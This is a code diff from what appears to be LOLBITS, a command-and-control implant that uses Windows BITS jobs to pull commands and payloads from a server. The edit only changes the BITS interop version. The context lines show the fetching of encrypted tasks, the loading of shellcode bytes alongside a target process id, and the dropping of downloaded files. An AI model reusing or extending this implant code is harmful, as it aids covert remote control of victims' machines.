@@ -8,7 +8,7 @@ using System.Threading;
 using LOLBITS.Loading;
 using LOLBITS.TokenManagement;
 using Newtonsoft.Json;
-using BITS4 = BITSReference4_0;
+using BITS = BITSReference2_5;
 
 namespace LOLBITS.Controlling
 {
@@ -85,7 +85,7 @@ namespace LOLBITS.Controlling
 
                 Console.WriteLine("next: " + _id);
 
-                if (_jobsManager.Get(_id, filePath, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
+                if (_jobsManager.Get(_id, filePath, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                 {
                     var file = GetEncryptedFileContent(filePath, out var unused);
 
@@ -125,7 +125,7 @@ namespace LOLBITS.Controlling
                             var fileP = _tempPath + @"\" + _id;
                             var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
 
-                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 try
                                 {
@@ -166,7 +166,7 @@ namespace LOLBITS.Controlling
                             if (file.Commands.Length >= 2)
                                 pid = int.Parse(file.Commands[1]);
 
-                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 byte[] sh;
                                 GetEncryptedFileContent(fileP, out sh);
@@ -211,7 +211,7 @@ namespace LOLBITS.Controlling
                             var fileP = _tempPath + @"\" + _id;
                             var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
 
-                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 File.Copy(fileP, file.Commands[1], true);
                                 rps = "Dowload finished.\n";
@@ -381,7 +381,7 @@ namespace LOLBITS.Controlling
             var cont = 0;
             while (cont < 5)
             {
-                if(_jobsManager.Get(_id, filePath, null,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
+                if(_jobsManager.Get(_id, filePath, null,BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                     return true;
 
                 ++cont;
